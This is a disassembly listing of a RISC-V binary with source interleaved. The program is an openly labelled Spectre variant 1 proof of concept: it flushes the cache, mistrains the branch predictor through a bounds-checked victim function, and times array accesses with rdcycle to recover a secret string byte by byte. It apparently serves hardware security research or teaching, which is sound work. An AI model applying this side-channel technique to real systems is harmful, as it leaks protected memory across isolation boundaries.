
bin/condBranchMispred.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <_start>:
   100b0:	0000d197          	auipc	gp,0xd
   100b4:	90818193          	addi	gp,gp,-1784 # 1c9b8 <__global_pointer$>
   100b8:	85818513          	addi	a0,gp,-1960 # 1c210 <_edata>
   100bc:	000b1617          	auipc	a2,0xb1
   100c0:	a6460613          	addi	a2,a2,-1436 # c0b20 <_end>
   100c4:	8e09                	sub	a2,a2,a0
   100c6:	4581                	li	a1,0
   100c8:	650000ef          	jal	ra,10718 <memset>
   100cc:	00000517          	auipc	a0,0x0
   100d0:	5a250513          	addi	a0,a0,1442 # 1066e <__libc_fini_array>
   100d4:	570000ef          	jal	ra,10644 <atexit>
   100d8:	5de000ef          	jal	ra,106b6 <__libc_init_array>
   100dc:	4502                	lw	a0,0(sp)
   100de:	002c                	addi	a1,sp,8
   100e0:	4601                	li	a2,0
   100e2:	308000ef          	jal	ra,103ea <main>
   100e6:	56a0006f          	j	10650 <exit>

00000000000100ea <_fini>:
   100ea:	8082                	ret

00000000000100ec <deregister_tm_clones>:
   100ec:	6571                	lui	a0,0x1c
   100ee:	67f1                	lui	a5,0x1c
   100f0:	1b850713          	addi	a4,a0,440 # 1c1b8 <__TMC_END__>
   100f4:	1b878793          	addi	a5,a5,440 # 1c1b8 <__TMC_END__>
   100f8:	00e78b63          	beq	a5,a4,1010e <deregister_tm_clones+0x22>
   100fc:	00000337          	lui	t1,0x0
   10100:	00030313          	mv	t1,t1
   10104:	00030563          	beqz	t1,1010e <deregister_tm_clones+0x22>
   10108:	1b850513          	addi	a0,a0,440
   1010c:	8302                	jr	t1
   1010e:	8082                	ret

0000000000010110 <register_tm_clones>:
   10110:	67f1                	lui	a5,0x1c
   10112:	6571                	lui	a0,0x1c
   10114:	1b878593          	addi	a1,a5,440 # 1c1b8 <__TMC_END__>
   10118:	1b850793          	addi	a5,a0,440 # 1c1b8 <__TMC_END__>
   1011c:	8d9d                	sub	a1,a1,a5
   1011e:	858d                	srai	a1,a1,0x3
   10120:	4789                	li	a5,2
   10122:	02f5c5b3          	div	a1,a1,a5
   10126:	c991                	beqz	a1,1013a <register_tm_clones+0x2a>
   10128:	00000337          	lui	t1,0x0
   1012c:	00030313          	mv	t1,t1
   10130:	00030563          	beqz	t1,1013a <register_tm_clones+0x2a>
   10134:	1b850513          	addi	a0,a0,440
   10138:	8302                	jr	t1
   1013a:	8082                	ret

000000000001013c <__do_global_dtors_aux>:
   1013c:	8801c703          	lbu	a4,-1920(gp) # 1c238 <completed.5212>
   10140:	eb15                	bnez	a4,10174 <__do_global_dtors_aux+0x38>
   10142:	1141                	addi	sp,sp,-16
   10144:	e022                	sd	s0,0(sp)
   10146:	e406                	sd	ra,8(sp)
   10148:	843e                	mv	s0,a5
   1014a:	fa3ff0ef          	jal	ra,100ec <deregister_tm_clones>
   1014e:	000007b7          	lui	a5,0x0
   10152:	00078793          	mv	a5,a5
   10156:	cb81                	beqz	a5,10166 <__do_global_dtors_aux+0x2a>
   10158:	656d                	lui	a0,0x1b
   1015a:	00050513          	mv	a0,a0
   1015e:	ffff0097          	auipc	ra,0xffff0
   10162:	ea2080e7          	jalr	-350(ra) # 0 <_start-0x100b0>
   10166:	4785                	li	a5,1
   10168:	88f18023          	sb	a5,-1920(gp) # 1c238 <completed.5212>
   1016c:	60a2                	ld	ra,8(sp)
   1016e:	6402                	ld	s0,0(sp)
   10170:	0141                	addi	sp,sp,16
   10172:	8082                	ret
   10174:	8082                	ret

0000000000010176 <frame_dummy>:
   10176:	000007b7          	lui	a5,0x0
   1017a:	00078793          	mv	a5,a5
   1017e:	cf91                	beqz	a5,1019a <frame_dummy+0x24>
   10180:	656d                	lui	a0,0x1b
   10182:	1141                	addi	sp,sp,-16
   10184:	88818593          	addi	a1,gp,-1912 # 1c240 <object.5217>
   10188:	00050513          	mv	a0,a0
   1018c:	e406                	sd	ra,8(sp)
   1018e:	ffff0097          	auipc	ra,0xffff0
   10192:	e72080e7          	jalr	-398(ra) # 0 <_start-0x100b0>
   10196:	60a2                	ld	ra,8(sp)
   10198:	0141                	addi	sp,sp,16
   1019a:	f77ff06f          	j	10110 <register_tm_clones>

000000000001019e <flushCache>:
 * cache.
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz){
   1019e:	711d                	addi	sp,sp,-96
   101a0:	eca2                	sd	s0,88(sp)
   101a2:	1080                	addi	s0,sp,96
   101a4:	faa43423          	sd	a0,-88(s0)
   101a8:	fab43023          	sd	a1,-96(s0)
    //printf("L1_SZ_BYTES = %luKB,SETS= %d, Block = %dBytes\n",L1_SZ_BYTES/(1024),L1_SETS,L1_BLOCK_SZ_BYTES);
    //printf("Flushed addr(0x%x) tag(0x%x) set(0x%x) off(0x%x) sz(%d)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // // find out the amount of blocks you want to clear
    //计算需要清除的缓存行数
    volatile uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
   101ac:	fa043783          	ld	a5,-96(s0)
   101b0:	8399                	srli	a5,a5,0x6
   101b2:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0){
   101b6:	fa043783          	ld	a5,-96(s0)
   101ba:	03f7f793          	andi	a5,a5,63
   101be:	c791                	beqz	a5,101ca <flushCache+0x2c>
        numSetsClear += 1;
   101c0:	fe843783          	ld	a5,-24(s0)
   101c4:	0785                	addi	a5,a5,1
   101c6:	fef43423          	sd	a5,-24(s0)
    }
    if (numSetsClear > L1_SETS){
   101ca:	fe843703          	ld	a4,-24(s0)
   101ce:	20000793          	li	a5,512
   101d2:	00e7f663          	bleu	a4,a5,101de <flushCache+0x40>
        //flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
   101d6:	20000793          	li	a5,512
   101da:	fef43423          	sd	a5,-24(s0)
    
    //volatile uint64_t numSetsClear = L1_SETS*2;
    //printf("numSetsClear(%d)\n", numSetsClear);

    // temp variable used for nothing
    volatile uint8_t dummy = 0;
   101de:	fe0403a3          	sb	zero,-25(s0)
    // 是连续的一组地址，将会填充cache ,计算存放的位置
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    
    volatile uint64_t alignedMem = (((uint64_t)&dummyMem) + L1_SZ_BYTES) & TAG_MASK;
   101e2:	67f5                	lui	a5,0x1d
   101e4:	a9878713          	addi	a4,a5,-1384 # 1ca98 <dummyMem>
   101e8:	67c1                	lui	a5,0x10
   101ea:	973e                	add	a4,a4,a5
   101ec:	77e1                	lui	a5,0xffff8
   101ee:	8ff9                	and	a5,a5,a4
   101f0:	fcf43c23          	sd	a5,-40(s0)

    //printf("alignedMem(0x%x)\n", alignedMem);
        
    for (volatile uint64_t i = 0; i < numSetsClear; ++i){
   101f4:	fc043823          	sd	zero,-48(s0)
   101f8:	a8b9                	j	10256 <flushCache+0xb8>
        // offset to move across the sets that you want to flush
        volatile uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
   101fa:	fa843783          	ld	a5,-88(s0)
   101fe:	8399                	srli	a5,a5,0x6
   10200:	1ff7f713          	andi	a4,a5,511
   10204:	fd043783          	ld	a5,-48(s0)
   10208:	97ba                	add	a5,a5,a4
   1020a:	079a                	slli	a5,a5,0x6
   1020c:	fcf43423          	sd	a5,-56(s0)
        //printf("setOffset(0x%x)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        //cache默认采用的是随机替换策略从而需要更多次的驱逐
        for(volatile uint64_t j = 0; j < 4*L1_WAYS; ++j){
   10210:	fc043023          	sd	zero,-64(s0)
   10214:	a03d                	j	10242 <flushCache+0xa4>
            // offset to reaccess the set
            volatile uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
   10216:	fc043783          	ld	a5,-64(s0)
   1021a:	07be                	slli	a5,a5,0xf
   1021c:	faf43c23          	sd	a5,-72(s0)

            // evict the previous cache block and put in the dummy mem
            // 来加载指定地址的垃圾数据到dummy数组中
            // 同时CPU会把这些垃圾数据更新到data cache
            // 从而实现对data cache指定空间的刷新操作
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
   10220:	fd843703          	ld	a4,-40(s0)
   10224:	fc843783          	ld	a5,-56(s0)
   10228:	973e                	add	a4,a4,a5
   1022a:	fb843783          	ld	a5,-72(s0)
   1022e:	97ba                	add	a5,a5,a4
   10230:	0007c783          	lbu	a5,0(a5) # ffffffffffff8000 <_end+0xfffffffffff374e0>
   10234:	fef403a3          	sb	a5,-25(s0)
        for(volatile uint64_t j = 0; j < 4*L1_WAYS; ++j){
   10238:	fc043783          	ld	a5,-64(s0)
   1023c:	0785                	addi	a5,a5,1
   1023e:	fcf43023          	sd	a5,-64(s0)
   10242:	fc043703          	ld	a4,-64(s0)
   10246:	479d                	li	a5,7
   10248:	fce7f7e3          	bleu	a4,a5,10216 <flushCache+0x78>
    for (volatile uint64_t i = 0; i < numSetsClear; ++i){
   1024c:	fd043783          	ld	a5,-48(s0)
   10250:	0785                	addi	a5,a5,1
   10252:	fcf43823          	sd	a5,-48(s0)
   10256:	fd043703          	ld	a4,-48(s0)
   1025a:	fe843783          	ld	a5,-24(s0)
   1025e:	f8f76ee3          	bltu	a4,a5,101fa <flushCache+0x5c>
            //printf("evict read(0x%x)\n", alignedMem + setOffset + wayOffset);
        }
    }
    //printf("%d ",dummy);
}
   10262:	0001                	nop
   10264:	6466                	ld	s0,88(sp)
   10266:	6125                	addi	sp,sp,96
   10268:	8082                	ret

000000000001026a <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
   1026a:	7139                	addi	sp,sp,-64
   1026c:	fc22                	sd	s0,56(sp)
   1026e:	0080                	addi	s0,sp,64
   10270:	fca43c23          	sd	a0,-40(s0)
   10274:	fcb43823          	sd	a1,-48(s0)
   10278:	fcc43423          	sd	a2,-56(s0)
   1027c:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
   10280:	fc043783          	ld	a5,-64(s0)
   10284:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
   10288:	fc043783          	ld	a5,-64(s0)
   1028c:	07a1                	addi	a5,a5,8
   1028e:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
   10292:	fe043423          	sd	zero,-24(s0)
   10296:	a075                	j	10342 <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
   10298:	fe843783          	ld	a5,-24(s0)
   1029c:	078e                	slli	a5,a5,0x3
   1029e:	fd843703          	ld	a4,-40(s0)
   102a2:	97ba                	add	a5,a5,a4
   102a4:	6398                	ld	a4,0(a5)
   102a6:	fc043783          	ld	a5,-64(s0)
   102aa:	639c                	ld	a5,0(a5)
   102ac:	04e7f563          	bleu	a4,a5,102f6 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
   102b0:	fc043783          	ld	a5,-64(s0)
   102b4:	07a1                	addi	a5,a5,8
   102b6:	fc043703          	ld	a4,-64(s0)
   102ba:	6318                	ld	a4,0(a4)
   102bc:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
   102be:	fe843783          	ld	a5,-24(s0)
   102c2:	078e                	slli	a5,a5,0x3
   102c4:	fd843703          	ld	a4,-40(s0)
   102c8:	97ba                	add	a5,a5,a4
   102ca:	6398                	ld	a4,0(a5)
   102cc:	fc043783          	ld	a5,-64(s0)
   102d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
   102d2:	fc843783          	ld	a5,-56(s0)
   102d6:	0785                	addi	a5,a5,1
   102d8:	fc843703          	ld	a4,-56(s0)
   102dc:	00074703          	lbu	a4,0(a4)
   102e0:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
   102e4:	fe843783          	ld	a5,-24(s0)
   102e8:	0ff7f713          	andi	a4,a5,255
   102ec:	fc843783          	ld	a5,-56(s0)
   102f0:	00e78023          	sb	a4,0(a5)
   102f4:	a091                	j	10338 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
   102f6:	fe843783          	ld	a5,-24(s0)
   102fa:	078e                	slli	a5,a5,0x3
   102fc:	fd843703          	ld	a4,-40(s0)
   10300:	97ba                	add	a5,a5,a4
   10302:	6398                	ld	a4,0(a5)
   10304:	fc043783          	ld	a5,-64(s0)
   10308:	07a1                	addi	a5,a5,8
   1030a:	639c                	ld	a5,0(a5)
   1030c:	02e7f663          	bleu	a4,a5,10338 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
   10310:	fe843783          	ld	a5,-24(s0)
   10314:	078e                	slli	a5,a5,0x3
   10316:	fd843703          	ld	a4,-40(s0)
   1031a:	973e                	add	a4,a4,a5
   1031c:	fc043783          	ld	a5,-64(s0)
   10320:	07a1                	addi	a5,a5,8
   10322:	6318                	ld	a4,0(a4)
   10324:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
   10326:	fc843783          	ld	a5,-56(s0)
   1032a:	0785                	addi	a5,a5,1
   1032c:	fe843703          	ld	a4,-24(s0)
   10330:	0ff77713          	andi	a4,a4,255
   10334:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
   10338:	fe843783          	ld	a5,-24(s0)
   1033c:	0785                	addi	a5,a5,1
   1033e:	fef43423          	sd	a5,-24(s0)
   10342:	fe843703          	ld	a4,-24(s0)
   10346:	fd043783          	ld	a5,-48(s0)
   1034a:	f4f767e3          	bltu	a4,a5,10298 <topTwoIdx+0x2e>
        }
    }
}
   1034e:	0001                	nop
   10350:	7462                	ld	s0,56(sp)
   10352:	6121                	addi	sp,sp,64
   10354:	8082                	ret

0000000000010356 <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
   10356:	7179                	addi	sp,sp,-48
   10358:	f422                	sd	s0,40(sp)
   1035a:	1800                	addi	s0,sp,48
   1035c:	fca43c23          	sd	a0,-40(s0)
    uint8_t dummy = 2;
   10360:	4789                	li	a5,2
   10362:	fef407a3          	sb	a5,-17(s0)

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
   10366:	8281b783          	ld	a5,-2008(gp) # 1c1e0 <array1_sz>
   1036a:	00479713          	slli	a4,a5,0x4
   1036e:	82e1b423          	sd	a4,-2008(gp) # 1c1e0 <array1_sz>
    asm("fcvt.s.lu	fa4, %[in]\n"
   10372:	8281b783          	ld	a5,-2008(gp) # 1c1e0 <array1_sz>
   10376:	fef44703          	lbu	a4,-17(s0)
   1037a:	d0377753          	fcvt.s.lu	fa4,a4
   1037e:	d037f7d3          	fcvt.s.lu	fa5,a5
   10382:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   10386:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   1038a:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   1038e:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   10392:	c0379753          	fcvt.lu.s	a4,fa5,rtz
   10396:	82e1b423          	sd	a4,-2008(gp) # 1c1e0 <array1_sz>
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
   1039a:	8281b783          	ld	a5,-2008(gp) # 1c1e0 <array1_sz>
   1039e:	fd843703          	ld	a4,-40(s0)
   103a2:	02f77863          	bleu	a5,a4,103d2 <victimFunc+0x7c>
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
   103a6:	67ed                	lui	a5,0x1b
   103a8:	01878713          	addi	a4,a5,24 # 1b018 <__fini_array_end>
   103ac:	fd843783          	ld	a5,-40(s0)
   103b0:	97ba                	add	a5,a5,a4
   103b2:	0007c783          	lbu	a5,0(a5)
   103b6:	2781                	sext.w	a5,a5
   103b8:	0067979b          	slliw	a5,a5,0x6
   103bc:	0007871b          	sext.w	a4,a5
   103c0:	000bd7b7          	lui	a5,0xbd
   103c4:	ad878793          	addi	a5,a5,-1320 # bcad8 <array2>
   103c8:	97ba                	add	a5,a5,a4
   103ca:	0007c783          	lbu	a5,0(a5)
   103ce:	fef407a3          	sb	a5,-17(s0)
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();
   103d2:	c00027f3          	rdcycle	a5
   103d6:	fef43023          	sd	a5,-32(s0)
   103da:	fe043783          	ld	a5,-32(s0)
   103de:	fef407a3          	sb	a5,-17(s0)
}
   103e2:	0001                	nop
   103e4:	7422                	ld	s0,40(sp)
   103e6:	6145                	addi	sp,sp,48
   103e8:	8082                	ret

00000000000103ea <main>:

int main(void){
   103ea:	7171                	addi	sp,sp,-176
   103ec:	f506                	sd	ra,168(sp)
   103ee:	f122                	sd	s0,160(sp)
   103f0:	1900                	addi	s0,sp,176
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
   103f2:	8301b783          	ld	a5,-2000(gp) # 1c1e8 <secretString>
   103f6:	873e                	mv	a4,a5
   103f8:	67ed                	lui	a5,0x1b
   103fa:	01878793          	addi	a5,a5,24 # 1b018 <__fini_array_end>
   103fe:	40f707b3          	sub	a5,a4,a5
   10402:	fef43423          	sd	a5,-24(s0)
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
   10406:	fe0403a3          	sb	zero,-25(s0)
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
   1040a:	67e9                	lui	a5,0x1a
   1040c:	fd078513          	addi	a0,a5,-48 # 19fd0 <__clzdi2+0x5a>
   10410:	478000ef          	jal	ra,10888 <puts>
    printf("the secret key is:%s \n", secretString);
   10414:	8301b783          	ld	a5,-2000(gp) # 1c1e8 <secretString>
   10418:	85be                	mv	a1,a5
   1041a:	67e9                	lui	a5,0x1a
   1041c:	04078513          	addi	a0,a5,64 # 1a040 <__clzdi2+0xca>
   10420:	3c4000ef          	jal	ra,107e4 <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
   10424:	fc043c23          	sd	zero,-40(s0)
   10428:	a419                	j	1062e <main+0x244>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
   1042a:	fc043823          	sd	zero,-48(s0)
   1042e:	a839                	j	1044c <main+0x62>
            results[cIdx] = 0;
   10430:	67f1                	lui	a5,0x1c
   10432:	fd043703          	ld	a4,-48(s0)
   10436:	070e                	slli	a4,a4,0x3
   10438:	27078793          	addi	a5,a5,624 # 1c270 <results.2500>
   1043c:	97ba                	add	a5,a5,a4
   1043e:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
   10442:	fd043783          	ld	a5,-48(s0)
   10446:	0785                	addi	a5,a5,1
   10448:	fcf43823          	sd	a5,-48(s0)
   1044c:	fd043703          	ld	a4,-48(s0)
   10450:	0ff00793          	li	a5,255
   10454:	fce7fee3          	bleu	a4,a5,10430 <main+0x46>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
   10458:	fc043423          	sd	zero,-56(s0)
   1045c:	a299                	j	105a2 <main+0x1b8>

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
   1045e:	000bd7b7          	lui	a5,0xbd
   10462:	ad878793          	addi	a5,a5,-1320 # bcad8 <array2>
   10466:	6591                	lui	a1,0x4
   10468:	853e                	mv	a0,a5
   1046a:	d35ff0ef          	jal	ra,1019e <flushCache>

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
   1046e:	04000793          	li	a5,64
   10472:	fcf43023          	sd	a5,-64(s0)
   10476:	a049                	j	104f8 <main+0x10e>
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
   10478:	8281b783          	ld	a5,-2008(gp) # 1c1e0 <array1_sz>
   1047c:	fc843703          	ld	a4,-56(s0)
   10480:	02f777b3          	remu	a5,a4,a5
   10484:	f8f43023          	sd	a5,-128(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
   10488:	fc043703          	ld	a4,-64(s0)
   1048c:	04100793          	li	a5,65
   10490:	02f767b3          	rem	a5,a4,a5
   10494:	17fd                	addi	a5,a5,-1
   10496:	873e                	mv	a4,a5
   10498:	77c1                	lui	a5,0xffff0
   1049a:	8ff9                	and	a5,a5,a4
   1049c:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
   104a0:	f7843783          	ld	a5,-136(s0)
   104a4:	83c1                	srli	a5,a5,0x10
   104a6:	f7843703          	ld	a4,-136(s0)
   104aa:	8fd9                	or	a5,a5,a4
   104ac:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
   104b0:	fe843703          	ld	a4,-24(s0)
   104b4:	f8043783          	ld	a5,-128(s0)
   104b8:	8f3d                	xor	a4,a4,a5
   104ba:	f7843783          	ld	a5,-136(s0)
   104be:	8ff9                	and	a5,a5,a4
   104c0:	f8043703          	ld	a4,-128(s0)
   104c4:	8fb9                	xor	a5,a5,a4
   104c6:	f6f43c23          	sd	a5,-136(s0)

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 100; ++k){
   104ca:	fa043c23          	sd	zero,-72(s0)
   104ce:	a031                	j	104da <main+0xf0>
   104d0:	fb843783          	ld	a5,-72(s0)
   104d4:	0785                	addi	a5,a5,1
   104d6:	faf43c23          	sd	a5,-72(s0)
   104da:	fb843703          	ld	a4,-72(s0)
   104de:	06300793          	li	a5,99
   104e2:	fee7f7e3          	bleu	a4,a5,104d0 <main+0xe6>
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
   104e6:	f7843503          	ld	a0,-136(s0)
   104ea:	e6dff0ef          	jal	ra,10356 <victimFunc>
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
   104ee:	fc043783          	ld	a5,-64(s0)
   104f2:	17fd                	addi	a5,a5,-1
   104f4:	fcf43023          	sd	a5,-64(s0)
   104f8:	fc043783          	ld	a5,-64(s0)
   104fc:	f607dee3          	bgez	a5,10478 <main+0x8e>
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
   10500:	fa043823          	sd	zero,-80(s0)
   10504:	a061                	j	1058c <main+0x1a2>
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
   10506:	fa043423          	sd	zero,-88(s0)
                start = rdcycle();
   1050a:	c00027f3          	rdcycle	a5
   1050e:	faf43023          	sd	a5,-96(s0)
   10512:	fa043783          	ld	a5,-96(s0)
   10516:	f8f43c23          	sd	a5,-104(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
   1051a:	fb043783          	ld	a5,-80(s0)
   1051e:	00679713          	slli	a4,a5,0x6
   10522:	000bd7b7          	lui	a5,0xbd
   10526:	ad878793          	addi	a5,a5,-1320 # bcad8 <array2>
   1052a:	97ba                	add	a5,a5,a4
   1052c:	0007c703          	lbu	a4,0(a5)
   10530:	fe744783          	lbu	a5,-25(s0)
   10534:	8ff9                	and	a5,a5,a4
   10536:	fef403a3          	sb	a5,-25(s0)
                diff = (rdcycle() - start);
   1053a:	c00027f3          	rdcycle	a5
   1053e:	f8f43823          	sd	a5,-112(s0)
   10542:	f9043703          	ld	a4,-112(s0)
   10546:	f9843783          	ld	a5,-104(s0)
   1054a:	40f707b3          	sub	a5,a4,a5
   1054e:	f8f43423          	sd	a5,-120(s0)

                if ( diff < CACHE_HIT_THRESHOLD ){
   10552:	f8843703          	ld	a4,-120(s0)
   10556:	03100793          	li	a5,49
   1055a:	02e7e463          	bltu	a5,a4,10582 <main+0x198>
                    results[i] += 1;
   1055e:	67f1                	lui	a5,0x1c
   10560:	fb043703          	ld	a4,-80(s0)
   10564:	070e                	slli	a4,a4,0x3
   10566:	27078793          	addi	a5,a5,624 # 1c270 <results.2500>
   1056a:	97ba                	add	a5,a5,a4
   1056c:	639c                	ld	a5,0(a5)
   1056e:	00178713          	addi	a4,a5,1
   10572:	67f1                	lui	a5,0x1c
   10574:	fb043683          	ld	a3,-80(s0)
   10578:	068e                	slli	a3,a3,0x3
   1057a:	27078793          	addi	a5,a5,624 # 1c270 <results.2500>
   1057e:	97b6                	add	a5,a5,a3
   10580:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
   10582:	fb043783          	ld	a5,-80(s0)
   10586:	0785                	addi	a5,a5,1
   10588:	faf43823          	sd	a5,-80(s0)
   1058c:	fb043703          	ld	a4,-80(s0)
   10590:	0ff00793          	li	a5,255
   10594:	f6e7f9e3          	bleu	a4,a5,10506 <main+0x11c>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
   10598:	fc843783          	ld	a5,-56(s0)
   1059c:	0785                	addi	a5,a5,1
   1059e:	fcf43423          	sd	a5,-56(s0)
   105a2:	fc843703          	ld	a4,-56(s0)
   105a6:	47a5                	li	a5,9
   105a8:	eae7fbe3          	bleu	a4,a5,1045e <main+0x74>
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
   105ac:	f6040713          	addi	a4,s0,-160
   105b0:	f7040793          	addi	a5,s0,-144
   105b4:	86ba                	mv	a3,a4
   105b6:	863e                	mv	a2,a5
   105b8:	10000593          	li	a1,256
   105bc:	67f1                	lui	a5,0x1c
   105be:	27078513          	addi	a0,a5,624 # 1c270 <results.2500>
   105c2:	ca9ff0ef          	jal	ra,1026a <topTwoIdx>

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
   105c6:	fe843703          	ld	a4,-24(s0)
   105ca:	67ed                	lui	a5,0x1b
   105cc:	01878793          	addi	a5,a5,24 # 1b018 <__fini_array_end>
   105d0:	00f705b3          	add	a1,a4,a5
   105d4:	8301b703          	ld	a4,-2000(gp) # 1c1e8 <secretString>
   105d8:	fd843783          	ld	a5,-40(s0)
   105dc:	97ba                	add	a5,a5,a4
   105de:	0007c783          	lbu	a5,0(a5)
   105e2:	0007861b          	sext.w	a2,a5
   105e6:	f6043683          	ld	a3,-160(s0)
   105ea:	f7044783          	lbu	a5,-144(s0)
   105ee:	0007871b          	sext.w	a4,a5
   105f2:	f7044783          	lbu	a5,-144(s0)
   105f6:	0007851b          	sext.w	a0,a5
   105fa:	f6843803          	ld	a6,-152(s0)
   105fe:	f7144783          	lbu	a5,-143(s0)
   10602:	0007889b          	sext.w	a7,a5
   10606:	f7144783          	lbu	a5,-143(s0)
   1060a:	2781                	sext.w	a5,a5
   1060c:	e03e                	sd	a5,0(sp)
   1060e:	87aa                	mv	a5,a0
   10610:	6569                	lui	a0,0x1a
   10612:	05850513          	addi	a0,a0,88 # 1a058 <__clzdi2+0xe2>
   10616:	1ce000ef          	jal	ra,107e4 <printf>

        // read in the next secret 
        ++attackIdx;
   1061a:	fe843783          	ld	a5,-24(s0)
   1061e:	0785                	addi	a5,a5,1
   10620:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
   10624:	fd843783          	ld	a5,-40(s0)
   10628:	0785                	addi	a5,a5,1
   1062a:	fcf43c23          	sd	a5,-40(s0)
   1062e:	fd843703          	ld	a4,-40(s0)
   10632:	47e5                	li	a5,25
   10634:	dee7fbe3          	bleu	a4,a5,1042a <main+0x40>
    }

    return 0;
   10638:	4781                	li	a5,0
}
   1063a:	853e                	mv	a0,a5
   1063c:	70aa                	ld	ra,168(sp)
   1063e:	740a                	ld	s0,160(sp)
   10640:	614d                	addi	sp,sp,176
   10642:	8082                	ret

0000000000010644 <atexit>:
   10644:	85aa                	mv	a1,a0
   10646:	4681                	li	a3,0
   10648:	4601                	li	a2,0
   1064a:	4501                	li	a0,0
   1064c:	1830106f          	j	11fce <__register_exitproc>

0000000000010650 <exit>:
   10650:	1141                	addi	sp,sp,-16
   10652:	4581                	li	a1,0
   10654:	e022                	sd	s0,0(sp)
   10656:	e406                	sd	ra,8(sp)
   10658:	842a                	mv	s0,a0
   1065a:	1d9010ef          	jal	ra,12032 <__call_exitprocs>
   1065e:	8381b503          	ld	a0,-1992(gp) # 1c1f0 <_global_impure_ptr>
   10662:	6d3c                	ld	a5,88(a0)
   10664:	c391                	beqz	a5,10668 <exit+0x18>
   10666:	9782                	jalr	a5
   10668:	8522                	mv	a0,s0
